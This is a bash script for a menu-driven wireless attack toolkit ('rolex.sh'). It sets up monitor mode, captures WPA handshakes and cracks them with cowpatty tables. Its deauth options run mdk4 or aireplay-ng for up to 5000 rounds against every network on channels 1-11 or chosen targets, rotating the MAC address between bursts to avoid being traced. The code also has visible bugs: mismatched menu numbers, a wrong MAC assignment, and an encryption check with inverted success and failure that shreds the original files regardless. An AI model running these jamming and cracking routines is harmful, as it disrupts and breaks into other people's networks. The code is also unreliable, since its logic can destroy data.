#!/bin/bash -

#  This program is free software; you can redistribute it and/or modify 
#  it under the terms of the GNU General Public License as published by 
#  the Free Software Foundation; either version 2 of the License, or    
#  (at your option) any later version.                                  

# -----------START OF USER CONFIGURATION------------

declare -rx Xwireless_wlan="wlan0"
declare -rx Xwireless_deauth_interval="20"

# -----------END OF USER CONFIGURATION------------

#===============================================================================
#          FILE: rolex.sh
#         USAGE: ./rolex.sh --start
#   DESCRIPTION: Luxurious pen-testing framework for the professional. 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: This is a super simple script, its really just many standalone scripts glued
#                together in a revolving door of case statements... A while statement serves as 
#                a wrapper by surrounding a single parent case statement, and its children case 
#                statements... Every 'Menu' would be a child case statement of the parent case 
#                statement.. You can easily pluck out and/or add in menu items if you know how to 
#                write shell scripts. You dont really have to worry about breaking anything.
#        AUTHOR: xXxSuPeRbxXx <https://github.com/aLeRt> 
#       CREATED: 01/14/2019 11:39
#      REVISION:  ---
#===============================================================================

# -----> Table of Contents <------
# => Variables
# => Colors
# => Enable Getopt
# => Check Root
# => Subroutines
# => Directory Check and Creation
# => Main Navigation Menu
# => Core Functionality
#---------------------------------

#############################################################
# => Variables
#############################################################

ROLEX='/root/Rolex'
run_in_newtab='xfce4-terminal --tab -e'

#############################################################
# => Colors
#############################################################

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"
pink="\033[1;35m"
normal="\e[1;0m"

#############################################################
# => Enable Getopt
#############################################################

TEMP=$(getopt -o 's,h,v,0,1,2,3,4' -l 'start,help,version,check,macchanger,wireless,encrypt,whatismyip' -n 'rolex.error' -- "$@")
if [ $? -ne 0 ]; then
    echo -e "Usage: \"rolex.sh --start\"" >&2
    echo -e "More info with: \"rolex.sh -h\"" >&2
    exit 1
fi
eval set -- "$TEMP"
unset TEMP

#############################################################
# => Check Root
#############################################################

if [[ $EUID -ne 0 ]]; then
    echo -e ""$red"You need root permissions to run this script!""$normal"""
    exit 1
fi

#############################################################
# => Subroutines
#############################################################

ScriptVersion="1.0"

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  usage
#   DESCRIPTION:  Display usage information.  
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function usage ()
{
    cat <<- EOT
Usage: ${0##/*/} [options] [--] 

Options: 

-h, --help       Display this message
-v, --version    Display script version

	EOT
}   # ----------  end of function usage  ----------

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  notification
#   DESCRIPTION:  For displaying notifications in the color green.  
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function notification ()
{
    echo -e "$green[+] $1" "$normal"
}   # ----------  end of function notification  ----------

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  warning
#   DESCRIPTION:  For displaying warnings in the color yellow.  
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function warning ()
{
    echo -e "$yellow[!] $1" "$normal"
}   # ----------  end of function warning  ----------

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  error
#   DESCRIPTION:  For displaying errors in the color red.  
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function error ()
{
    echo -e "$red[-] $1" "$normal"
}   # ----------  end of function error  ----------

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  checkDependencies
#   DESCRIPTION:  Check for required packages (boxes, lolcat, git, etc).  
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function checkDependencies ()
{
    local depends=(
	            "/usr/games/lolcat"
                    "boxes"
                    "git"
		    "curl"
	 	  )

    for i in ${depends[@]}; do
        if ! which $i >/dev/null 2>&1; then
		    [ $i = '/usr/games/lolcat' ] && i=$(basename '/usr/games/lolcat')
            error "$i..........Not installed! `sleep 0.025`"
            exit=1
        fi
    done    

    if [ "$exit" = 1 ]; then
        TEMP_CHECK_CACHE=$(ls $ROLEX/Cache | grep .deb)
        if [ $? -eq 0 ]; then
            echo
            until  [[ $ask_local_install = [IiCc] ]]; do
                read -p "Required dependencies missing, would you like to run the installer or install from the local cache: [I|c]?> " ask_local_install
            done
            if [[ $ask_local_install = [Cc] ]]; then
                dpkg -iR $ROLEX/Cache/
	    else
                cachePackages
                apt-get update
                apt-get -y install boxes lolcat git curl
                apt-get -y install --fix-broken
                exit 1
            fi
        fi
    fi

    sleep 1
    clear
}   # ----------  end of function checkDependencies  ----------
checkDependencies

#---  FUNCTION  ----------------------------------------------------------------
#          NAME:  checkPackages
#   DESCRIPTION:  Used by the runtime option 'Install Packages' to report on the installation state of optional packages. 
#    PARAMETERS:  
#       RETURNS:  
#-------------------------------------------------------------------------------

function checkPackages ()
{

# Predefined list of packages
PACKAGE_LIST=( 
	       cowpatty 
	       aircrack-ng 
	       mdk4 
	       macchanger
	       wireshark
             )

# Check which packages are missing and add them to the MISSING_PACKAGES array
MISSING_PACKAGES=()
for PACKAGE in "${PACKAGE_LIST[@]}"; do
    if ! dpkg -s "$PACKAGE" > /dev/null 2>&1; then
        MISSING_PACKAGES+=("$PACKAGE")
    fi
done

# Exit if no missing packages
if [[ "${#MISSING_PACKAGES[@]}" -eq 0 ]]; then
    notification "All packages are already installed."
    return 0

# Ask users if they want to install missing packages
else
    warning "The following packages are missing: ${MISSING_PACKAGES[*]}"
    until [[ "$INSTALL_PACKAGES" = [YyNn] ]]; do
  	read -p "Do you want to install missing packages: [Y|n]?> " INSTALL_PACKAGES
    done

    if [[ "$INSTALL_PACKAGES" = [Yy] ]]; then
        echo "Select package(s) to install (or enter 'reset' to start over): "
        while true; do
            select PACKAGE in "${MISSING_PACKAGES[@]}" reset all done exit; do
	        case "$PACKAGE" in
	            reset) # reset items incase user made mistake and selected item they didnt want, and thus removes all items from the array
                        INSTALL_LIST=()
                        warning "Item list reset."
                        break
                        ;;
                     all)  # option to select all packages and add them to the array
                        INSTALL_LIST=("${MISSING_PACKAGES[@]}")
                        notification "All missing packages have been added to the installation list."
                        break
                        ;;
                     done) # finish selecting packages and installs them and also caches them to $ROLEX/Cache
                            INSTALL_LIST=("${INSTALL_LIST[@]/done}") # remove 'done' as a list item from the array
	                    apt-get update
                            apt-get --fix-broken -y -o Dir::Cache::Archives=$ROLEX/Cache install "${INSTALL_LIST[@]}" 2>/dev/null
                            break
                        ;;
                     exit) # exit
                        return 0
                        ;;
                     *)    # for every package a user selects it will get added to the array
                        INSTALL_LIST+=("$PACKAGE")
                        notification "Added $PACKAGE to the installation list."
                        break
                        ;;
                esac
            done
        done
    fi
fi
}   # ----------  end of function checkPackages  ----------

#############################################################
# => Directory Check and Creation
#############################################################

# Output from Rolex is stored in these respective directories
[ -d /tmp/Rolex ]            || mkdir -m 700 /tmp/Rolex
[ -d /tmp/Rolex/AIRSCAN ]    || mkdir /tmp/Rolex/AIRSCAN
[ -d /tmp/Rolex/COWPATTY ]   || mkdir /tmp/Rolex/COWPATTY

#############################################################
# => Main Navigation Menu
#############################################################

while
    case "$1" in
        '-h'|'--help')     usage; exit 0  ;;
        '-v'|'--version')  echo "$0 -- Version $ScriptVersion"; exit 0  ;;
        '-s'|'--start')
    
            echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"| /usr/games/lolcat -a -s 40
            tput setaf 7 ; tput bold
            echo "######  ####### #       ####### #     #"
            echo "#     # #     # #       #         # #"
            echo "######  #     # #       #####      #"    
            echo "#    #  #     # #       #        #   #"  
            echo "#     # ####### ####### ####### #     #"
            echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"| /usr/games/lolcat -a -s 40
            tput setaf 7 ; tput bold
            sleep 0.01 && echo "Install Packages    = 0"
            sleep 0.01 && echo "Macchanger          = 1"
            sleep 0.01 && echo "Whatismyip          = 2"
            sleep 0.01 && echo "Wireless Menu       = 3"
            sleep 0.01 && echo "Encrypt             = 4"
            echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"| /usr/games/lolcat -a -s 40
            echo
            echo -en ""$yellow" ⚡ "$white`whoami`$pink"@"$white"rolex"$pink"  ~   "$normal"" 
            read option 
            
            [ $option = 0 ]  && /bin/sh -c "$ROLEX/rolex.sh --check"
            [ $option = 1 ]  && /bin/sh -c "$ROLEX/rolex.sh --macchanger"
            [ $option = 2 ]  && /bin/sh -c "$ROLEX/rolex.sh --whatismyip"
            [ $option = 3 ]  && /bin/sh -c "$ROLEX/rolex.sh --wireless"
            [ $option = 4 ]  && /bin/sh -c "$ROLEX/rolex.sh --encrypt"
            #[ $option != [0-4] ] && clear
	    clear
	    continue

    	    ;;
    
#############################################################
# => Core Functionality
#############################################################
    
        '--check')
		checkPackages
		if checkPackages; then
                    notification "All packages are already installed."
		fi
		break
	        ;;

        #================== Macchanger
        '--macchanger')
            missing_packages=$(checkPackages | egrep "MISSING! macchanger") && clear && echo "$missing_packages" && break
    
            ip -c a
            echo
            read -p "Select an interface: " iface
            until  [[ $ask_mac_type = [RrCc] ]]; do
                read -p "Random MAC or choose your own: [R|c]?> " ask_mac_type
            done

			ip link set $iface down

			if [[ $ask_mac_type = [Rr] ]]; then
                macchanger -br $iface
                ip link set $iface up
                clear ; break

			else
                read -p "Enter the new MAC address: " custom_mac
                ip link set $iface address $iface
                ip link set $iface up
                clear
                break
            fi  
    	    ;;
    
        #================== Whatismyip
        '--whatismyip')
            clear
            curl ipinfo.io | boxes -a c -d parchment | /usr/games/lolcat && read -p "" && clear  
    	    ;;
    
        #================== Wireless Menu
        '--wireless')
            reset
            cat $ROLEX/Logos/pineapple-logo.txt | /usr/games/lolcat -a -s 150 -d 17
            while
                echo               "#=================="| /usr/games/lolcat -a
                tput setaf 7 ; tput bold
                sleep 0.01 && echo "Back           = 0"
                sleep 0.01 && echo "Setup          = 1"
                sleep 0.01 && echo "RFmon          = 3"
                sleep 0.01 && echo "Airscan        = 4"
                sleep 0.01 && echo "Profile        = 5"
                sleep 0.01 && echo "Deauth         = 6"
                sleep 0.01 && echo "Make Rainbow   = 7"
                sleep 0.01 && echo "Check Rainbow  = 8"
                echo               "#=================="| /usr/games/lolcat -a
                echo
                tput sgr0
    
                echo -en ""$yellow"⚡ "$white"superb"$pink"@"$white"wireless"$pink"  ~   "$normal"" 
                read option
    
                # Filter for missing packages and break before execution if matched
                [[ $option = 4 ]]    && missing_packages=$(checkPackages | egrep "MISSING! aircrack-ng|someotherpackage") && clear && echo "$missing_packages" && break
                [[ $option = [67] ]] && missing_packages=$(checkPackages | egrep "MISSING! cowpatty|someotherpackage")    && clear && echo "$missing_packages" && break
                [[ $option = 5 ]]    && missing_packages=$(checkPackages | egrep "MISSING! aircrack-ng|MISSING! mdk4")    && clear && echo "$missing_packages" && break
    
                case $option in
    
                0)   /bin/sh -c "$ROLEX/rolex.sh --start"  ;;
    
                1)   clear
                     while read -p "> Which interface would you like to initialize for wireless attacks? ('?', 'none', 'done') [`grep ^"declare -rx Xwireless_wlan=" rolex.sh | awk -F= '{print$2}' | sed \
                     's/"//g'`]: " wireless_wlan; do
                         [[ $wireless_wlan = "" || $wireless_wlan = done ]] && notification "OK!" && break
                         [[ $wireless_wlan = none ]] && sed -i  "9s/.*/declare -rx Xwireless_wlan=\"\"/" $ROLEX/rolex.sh && warning "RESET!" && break
                         [[ $wireless_wlan = "?" ]] && clear && cat $ROLEX/Common/wireless_wlan.txt | /usr/games/lolcat && read -p "" && clear && continue
                         sed -i  "9s/.*/declare -rx Xwireless_wlan=\"$wireless_wlan\"/" $ROLEX/rolex.sh && warning "CHANGED!" && break
                     done
    
                     while read -p "> Enter your Pinapple MAC address ('?', 'none', 'done') [`grep ^"declare -rx Xwireless_pinapple_mac=" rolex.sh | awk -F= '{print$2}' | sed 's/"//g'`]: " \
                     wireless_pinapple_mac; do
                         [[ $wireless_pinapple_mac = "" || $wireless_pinapple_mac = done ]] && notification "OK!" && break
                         [[ $wireless_pinapple_mac = none ]] && sed -i "10s/.*/declare -rx Xwireless_pinapple_mac=\"\"/" $ROLEX/rolex.sh && warning "RESET!" && break
                         [[ $wireless_pinapple_mac = "?" ]] && clear && cat $ROLEX/Common/wireless_pinapple_mac.txt | /usr/games/lolcat && read -p "" && clear && continue
                         sed -i "10s/.*/declare -rx Xwireless_pinapple_mac=\"$wireless_pinapple_mac\"/" $ROLEX/rolex.sh && warning "CHANGED!" && break
                     done
    
                     while read -p "> Set Wi-Fi deauthing intervals, measured in seconds, e.g. 60 ('?', 'none', 'done') [`grep ^"declare -rx Xwireless_deauth_interval=" rolex.sh | awk -F= '{print$2}' | sed 's/"//g'`]: " \
                     wireless_deauth_interval; do
                         [[ $wireless_deauth_interval = "" || $wireless_deauth_interval = done ]] && notification "OK!" && break
                         [[ $wireless_deauth_interval = none ]] && sed -i "11s/.*/declare -rx Xwireless_deauth_interval=\"\"/" $ROLEX/rolex.sh && warning "RESET!" && break
                         [[ $wireless_deauth_interval = "?" ]] && clear && cat $ROLEX/Common/wireless_deauth_interval.txt | /usr/games/lolcat && read -p "" && clear && continue
                         sed -i "11s/.*/declare -rx Xwireless_deauth_interval=\"$wireless_deauth_interval\"/" $ROLEX/rolex.sh && warning "CHANGED!" && break
                     done
                     /bin/sh -c "$ROLEX/rolex.sh --wireless"  
    		    ;;
    
                3)   clear
                     until  [[ $ask_rfmon = [DdEe] ]]; do
                         read -p "'Disable' or 'enable' monitor mode: [D|e]?> " ask_rfmon
                     done

					 if [[ $ask_rfmon = [Ee] ]]; then
                         airmon-ng start $Xwireless_wlan       >/dev/null 2>&1
                         ip link set ${Xwireless_wlan}mon down >/dev/null 2>&1
                         macchanger -br ${Xwireless_wlan}mon   >/dev/null 2>&1
                         ip link set ${Xwireless_wlan}mon up   >/dev/null 2>&1
                     else
                         airmon-ng stop ${Xwireless_wlan}mon   >/dev/null 2>&1
                     fi
                     clear  
    		    ;;
    
                4)   clear
                     until  [[ $ask_scan_type = [EeCcAaOo] ]]; do
                         read -p "What would you like to scan ('Everything', 'channel', 'AP', 'open'): [E|c|A|o]?> " ask_scan_type
                     done
    
                     # Option 'E'
                     if [[ $ask_scan_type = [Ee] ]]; then
                         until  [[ $ask_active_E = [YyNn] ]]; do
                             read -p "Look only for active clients: [Y|n]?> " ask_active_E
                         done
                         if [[ $ask_active_E = [Yy] ]]; then
                             $run_in_newtab "airodump-ng ${Xwireless_wlan}mon -U -M -a -w /tmp/Rolex/AIRSCAN/cap_everything_active"
                             clear
                         else
                             $run_in_newtab "airodump-ng ${Xwireless_wlan}mon -U -M -w /tmp/Rolex/AIRSCAN/cap_everything"
                             clear
                         fi
    

                     # Option 'c'
					 elif [[ $ask_scan_type = [cC] ]]; then
                         until  [[ $channel = 1..14 ]]; do
                             read -p "Enter channel number: " channel
                         done
                         until  [[ $ask_active_c = [YyNn] ]]; do
                             read -p "Look only for active clients: [Y|n]?> " ask_active_c
                         done
                         if [[ $ask_active_c = [Yy] ]]; then
                             $run_in_newtab "$ROLEX/rolex.sh --wireless"
                             airodump-ng ${Xwireless_wlan}mon -U -M -c $channel -a -w /tmp/Rolex/AIRSCAN/cap_CH$channel\_active
                             break
                         else
                             $run_in_newtab "$ROLEX/rolex.sh --wireless"
                             airodump-ng ${Xwireless_wlan}mon -U -M -c $channel -w /tmp/Rolex/AIRSCAN/cap_CH$channel
                             break
                         fi
    

                     # Option 'A'
					 elif [[ $ask_scan_type = [Aa] ]]; then
                         read -p "Enter BSSID and channel of AP (seperated by whitespace): " bssid channel
                         $run_in_newtab "$ROLEX/rolex.sh --wireless"
                         airodump-ng ${Xwireless_wlan}mon -U -M -d $bssid -c $channel -w /tmp/Rolex/AIRSCAN/cap_ap_$bssid
                         break
    

                     # Option 'o'
					 else
                         until  [[ $ask_opn_or_ch = [AaCc] ]]; do
                             read -p "'All' open networks or a certain 'channel': [A|c]?> " ask_opn_or_ch
                         done
                         if [[ $ask_opn_or_ch = [Aa] ]]; then
                             until  [[ $ask_active_o = [YyNn] ]]; do
                                 read -p "Look only for active clients: [Y|n]?> " ask_active_o
                             done
                             if [[ $ask_active_o = [Yy] ]]; then
                                 $run_in_newtab "$ROLEX/rolex.sh --wireless"
                                 airodump-ng ${Xwireless_wlan}mon -U -M -t OPN -a -w /tmp/Rolex/AIRSCAN/cap_everything_open_active
                                 break
                             else
                                 $run_in_newtab "$ROLEX/rolex.sh --wireless"
                                 airodump-ng ${Xwireless_wlan}mon -U -M -t OPN -w /tmp/Rolex/AIRSCAN/cap_everything_open
                                 break
                         fi
    
                         elif [[ $ask_opn_or_ch = [cC] ]]; then
                             until  [[ $ask_active_o2 = [YyNn] ]]; do
                                 read -p "Look only for active clients: [Y|n]?> " ask_active_o2
                             done
                             if [[ $ask_active_o2 = [Yy] ]]; then
                                 until  [[ $channel = 1..14 ]]; do
                                     read -p "Enter channel number: " channel
                                 done
                                 $run_in_newtab "$ROLEX/rolex.sh --wireless"
                                 airodump-ng ${Xwireless_wlan}mon -U -M -c $channel -t OPN -a -w /tmp/Rolex/AIRSCAN/cap_open_CH$channel\_active
                                 break
                             else
                                 $run_in_newtab "$ROLEX/rolex.sh --wireless"
                                 airodump-ng ${Xwireless_wlan}mon -U -M -c $channel -t OPN -w /tmp/Rolex/AIRSCAN/cap_open_CH$channel
                                 break
                             fi
                         fi
                     fi  
    		    ;;
    
                5)   clear
                     echo "$Xwireless_pinapple_mac" > ~/.pinapple-whitelist.txt
                     until  [[ $ask_deauth_type = [EeCcAaSs] ]]; do
                         read -p "What would you like to deauth ('Everything', 'channel', 'AP', 'station'): [E|c|A|s]?> " ask_deauth_type
                     done
                     clear
    
                     # Option 'E'
                     if [[ $ask_deauth_type = [Ee] ]]; then
                             reset
                             for i in {1..5000}; do                                       # this for loop executes 5000 times
                                 cat $ROLEX/Common/wireless_airjam_nuke.txt | /usr/games/lolcat -a
                                 mdk4 ${Xwireless_wlan}mon d -c 1,2,3,4,5,6,7,8,9,10,11 -w ~/.pinapple-whitelist.txt >/dev/null 2>&1 & # mdk4 by default deauths channels 1-14; in U.S. we use 1-11
                                 sleep ${Xwireless_deauth_interval}s
                                 killall mdk4 
                                 cat $ROLEX/Common/unicorn_sleep.txt | /usr/games/lolcat -a
                                 sleep ${Xwireless_deauth_interval}s
                                 ip link set ${Xwireless_wlan}mon down
                                 macchanger -br ${Xwireless_wlan}mon >/dev/null 2>&1 ; ip link set ${Xwireless_wlan}mon up
                             done
    

                     # Option 'c'
					 elif [[ $ask_deauth_type = [cC] ]]; then
                         until  [[ $ch[1-14] = 1..14 ]]; do
                             read -p "Enter channel numbers (seperated by whitespace): " ch1 ch2 ch3 ch4 ch5 ch5 ch7 ch8 ch9 ch10 ch11 ch12 ch13 ch14
                         done
                         reset
                         for i in {1..5000}; do
                             cat $ROLEX/Common/nuke.txt | /usr/games/lolcat -a
                             mdk4 ${Xwireless_wlan}mon d -c $ch1,$ch2,$ch3,$ch4,$ch5,$ch6,$ch7,$ch8,$ch9,$ch10,$ch11,$ch12,$ch13,$ch14 -w ~/.pinapple-whitelist.txt >/dev/null 2>&1 &
                             sleep ${Xwireless_deauth_interval}s
                             killall mdk4
                             cat $ROLEX/Common/unicorn_sleep.txt | /usr/games/lolcat -a
                             sleep ${Xwireless_deauth_interval}s
                             ip link set ${Xwireless_wlan}mon down
                             macchanger -br ${Xwireless_wlan}mon >/dev/null 2>&1 ; ip link set ${Xwireless_wlan}mon up
                         done
    

                     # Option 'A'
					 elif [[ $ask_deauth_type = [Aa] ]]; then
                         read -p "Enter BSSIDs of APs (seperated by whitespace): " bssid1 bssid2 bssid3 bssid4 bssid5 bssid6
                         reset
                         echo -e "$bssid1\n""$bssid2\n""$bssid3\n""$bssid4\n""$bssid5\n""$bssid6\n" >> ~/.blacklist.txt
                         for i in {1..5000}; do
                              cat $ROLEX/Common/nuke.txt | /usr/games/lolcat -a
                              mdk4 ${Xwireless_wlan}mon d -b ~/.blacklist.txt >/dev/null 2>&1 & # QUESTION: will it channel hop if I dont specify a channel?
                              sleep ${Xwireless_deauth_interval}s
                              killall mdk4
                              cat $ROLEX/Common/unicorn_sleep.txt | /usr/games/lolcat -a
                              sleep ${Xwireless_deauth_interval}s
                              ip link set ${Xwireless_wlan}mon down
                              macchanger -br ${Xwireless_wlan}mon >/dev/null 2>&1 ; ip link set ${Xwireless_wlan}mon up
                         done
    

                     # Option 's'
                     else
                         read -p "Enter BSSID of AP and MACs of associated clients (seperated by whitespace): " bssid client # QUESTION: can mdk4 deauth STAs (i dont think so, the 'd' test mode target's APs)?
                         reset
                         for i in {1..5000}; do
                             cat $ROLEX/Common/wireless_airjam_nuke.txt | /usr/games/lolcat -a
                             aireplay-ng --deauth 1000 -a $bssid -c $client ${Xwireless_wlan}mon
                             sleep ${Xwireless_deauth_interval}s
                             killall aireplay-ng
                             cat $ROLEX/Common/unicorn_sleep.txt | /usr/games/lolcat -a
                             sleep ${Xwireless_deauth_interval}s
                             ip link set ${Xwireless_wlan}mon down
                             macchanger -br ${Xwireless_wlan}mon >/dev/null 2>&1 ; ip link set ${Xwireless_wlan}mon up
                         done
                     fi  
    		    ;;
    
                6)   clear
                     until [[ -s "$wordlist" || $wordlist = none ]]; do
                         read -p "Enter /path/to/wordlist, or use keyword 'none' to use the default: " wordlist
                     done
                     read -p "Enter a target SSID: " ssid
                     if [ $wordlist = none ]; then
                         genpmk -f $ROLEX/Common/sesh0ne -d /tmp/Rolex/COWPATTY/rainbow_hashes -s $ssid
                     else
                         genpmk -f $wordlist -d /tmp/Rolex/COWPATTY/rainbow_hashes -s $ssid
                     fi  
    		    ;;
                
                7)   clear
                     cat $ROLEX/Common/wireless_cowsay_prerequites.txt | /usr/games/lolcat
                     until [[ -s "$handshake" && "$hashes" ]]; do
                         read -p "Enter /path/to/handshake and /path/to/hashes (seperated by whitespace): " handshake hashes
                     done
                     read -p "Enter the ESSID the handshake came from: " essid # see if the essid can be extracted from the cap file; so we wont need this line
                     cowpatty -d $hashes -r $handshake -s $essid
                     clear 
    		    ;;
    
                *)   clear ; error "rolex.error: invalid option -- `echo \'$option\'`"
    
                esac; do :
            done  
    	;;
        
        #================ Encrypt
        '--encrypt')
            clear
            read -p "Regexp: " crypt_regex
            until  [[ $crypt_type = [SsAaCc] ]]; do
                read -p "Select an encryption type ('Symmectrical', 'asymmectrical', 'Encrypted Container'): [S|a|C]?> " crypt_type
            done

            # Option 'S'
            if [[ $crypt_type = [Ss] ]]; then
                while true; do
                    read -sp "Enter a password: " crypt_pass
                    echo
                    read -sp "Confirm password: " crypt_pass_confirm
                    [ "$crypt_pass" = "$crypt_pass_confirm" ] && break
                    echo ; error "Passwords do not match, try again"
                done

                echo;echo
					
                for i in $crypt_regex; do
                    gpg --batch -c --cipher-algo twofish --passphrase "$crypt_pass" $i >/dev/null 2>&1
                    if [ $? -ne 0 ]; then
                        error "== $i == FAILED!" 2> $ROLEX/Logs/encrypt-errors
                    else
                        notification "== $i == ENCRYPTED!"
                    fi
                        shred -fuz $i >/dev/null 2>&1
                done
            

            # Option 'a'
			elif [[ $crypt_type = [Aa] ]]; then
                read -sp "Enter the name of your key: " crypt_keyname
                for i in $crypt_regex; do
                    gpg -ar $crypt_keyname -o $i.gpg -ebs $i >/dev/null 2>&1 #signs and makes a detached signature for both verification AND integrity
                    if [ $? -ne 0 ]; then
                        notification "== $i == ENCRYPTED!"
                    else
                        error "== $i == FAILED!" 2> $ROLEX/Logs/encrypt-errors
                    fi
                    shred -fuz $i >/dev/null 2>&1
                done

    
            # Option 'C'
            else
                function nameVol ()
                {
                    read -p "Name of encrypted container (e.g., "Vault", "grocerylist.txt"): " vol_name
                    if [[ ! -n "$vol_name" ]]; then
                        vol_name='EncryptedContainer'
                    fi
                };
                function nameKey ()
                {
                    read -p "Name of Key file (e.g., "master.keyfile", "image.jpg"): " key_file
                    if [[ ! -n "$key_file" ]]; then
                        key_file='master.keyfile'
                    fi
                };
                function nameMount ()
                {
                    read -p "Where to mount the container when it's unlocked (e.g., "/home/bob/someDir"): " mount_dir
                    if [[ ! -n "$mount_dir" ]]; then
                        mount_dir='luksPrivate'
                    fi
                    mount_dir_basename=$(basename $mount_dir)
                };
                function nameSize ()
                {
                    read -p "Choose volume size (e.g., 10G, 200M): " vol_size
                    if [[ ! -n "$vol_size" ]]; then
                        vol_size='1G'
                    fi
                    echo
                };
                function ddZero ()
                {
                    dd if=/dev/zero of="$vol_name" bs=1 count=0 seek="$vol_size" && echo && notification "Empty volume created.\n"
                };
                function ddRandom ()
                {
                    dd if=/dev/urandom of="$key_file" bs=4096 count=1 && echo && notification "Key file successfully created."
                };
                function encryptCon ()
                {
                    cryptsetup -v -y -c aes-xts-plain64 -s 512 -h sha512 -i 5000 --use-random luksFormat "$vol_name" "$key_file" && echo && notification "Encrypted container created."
                };
                function encryptOpen ()
                {
                    cryptsetup luksOpen "$vol_name" "$mount_dir_basename" --key-file "$key_file" && echo && notification "Volume unlocked.\n"
                };
                function mkfsFormat ()
                {
                    mkfs.ext4 /dev/mapper/$mount_dir_basename && notification "Volume formatted."
                };
                function mountDir ()
                {
                    if [[ ! -d "$mount_dir" ]]; then
                        mkdir -p "$mount_dir"
                    fi
                    mount /dev/mapper/$mount_dir_basename "$mount_dir" && echo && notification "Volume mounted."
                };
                function volPerm ()
                {
                    chown -R "$USER":"$USER" "$mount_dir" && echo && notification "Volume permissions set. Don't lose the Key file!"
                }
                nameVol
                nameKey
                nameMount
                nameSize
                ddZero
                ddRandom
                encryptCon
                encryptOpen
                mkfsFormat
                mountDir
                volPerm
                
                mv $crypt_regex "$mount_dir"
                umount "$mount_dir" && cryptsetup luksClose $mount_dir_basename
            fi
            /bin/sh -c "$ROLEX/rolex.sh --start"  
    	;;
    
    esac; do :
done

